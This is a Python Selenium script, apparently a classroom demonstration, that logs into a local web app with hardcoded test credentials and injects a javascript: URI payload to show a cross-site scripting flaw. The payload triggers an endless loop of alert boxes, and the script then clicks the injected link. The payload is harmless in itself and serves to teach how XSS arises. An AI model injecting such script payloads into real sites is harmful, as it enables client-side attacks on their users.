# -*- coding: utf-8 -*-

# 进入跨站脚本漏洞页面，演示跨站脚本漏洞的发生过程

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import requests
import time
import os
import re
import platform
from lxml import etree
from datetime import datetime

class hello_spider:
    driver = None
    main_page_url = 'http://127.0.0.1:5000'
    main_page_title = 'Log In'

    base_url = 'http://127.0.0.1:5000'
    portal_url = 'http://i.cuc.edu.cn/cucdcp/forward.action?path=/portal/portal&p=oaemail&ac=1'

    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
                             'Chrome/51.0.2704.63 Safari/537.36'}
    cookies = None
    request_session = None

    def __init__(self):

        if platform.system() == 'Windows':
            self.chrome_driver_path = "chromedriver.exe"
        # Linux或者OS X
        elif platform.system() == 'Linux' or platform.system() == 'Darwin':
            self.chrome_driver_path = "chromedriver"
        else:
            print('Unknown System Type. quit...')
            return None

        requests.headers = self.headers

        try:
            r = requests.get(self.main_page_url)
        except requests.exceptions.RequestException as e:
            print('链接异常，请检查网络')
            print(e)
            quit()

        if (r.status_code != 200):
            print('http状态码错误')
            quit()

        chrome_options = Options()
        # chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')
        self.driver = webdriver.Chrome(chrome_options=chrome_options, executable_path=self.chrome_driver_path)

        return None

    # set cookies when login suceed
    def logIn(self):
        self.driver.get(self.main_page_url)
        time.sleep(1)
        if self.driver.title != self.main_page_title:
            print('不是期望的主页Title，网页改版了？')
            return False
        elem_username = self.driver.find_element_by_name('username')
        elem_pasword = self.driver.find_element_by_name('password')
        elem_username.send_keys('gy5461')
        time.sleep(1)
        elem_pasword.send_keys('123456')
        time.sleep(1)
        elem_submit = self.driver.find_element_by_name('submit')
        elem_submit.click()
        time.sleep(1)

        elem_review = self.driver.find_element_by_id('1')
        elem_review.click()
        time.sleep(1)

        elem_script = self.driver.find_element_by_id('script')
        elem_submit = self.driver.find_element_by_id('submit')

        elem_click = self.driver.find_element_by_id('click')
        elem_click.click()
        time.sleep(1)
        self.driver.switch_to.alert.accept()
        time.sleep(1)

        elem_script.send_keys("javascript:for(var i=1;i<=10;i++){if(i==5){for(var j=1;j<=3;j++)alert(\"再坚持一会儿，就快成功了！！\");} alert('Warning: the site is Under Attack!!!');if(i==10)i=0;}")
        elem_submit.click()
        time.sleep(1)

        elem_click = self.driver.find_element_by_id('click')
        elem_click.click()

        time.sleep(1)

        return True

    def jump_page(self):

        '//*[@id="appMenuWidget-content"]/div/div[4]/ul/li[2]/a'
        x_path_per_info = "//a[@class='left_tab_core']/font[text()='个人信息']"
        while(self.driver.switch_to.alert):
            self.driver.switch_to.alert.accept()
            time.sleep(1)
        link_to_per_info = self.driver.find_element_by_xpath(x_path_per_info)
        link_to_per_info.click()

        return

if __name__ == "__main__":
    sp = hello_spider()
    if sp.logIn():
        sp.jump_page()
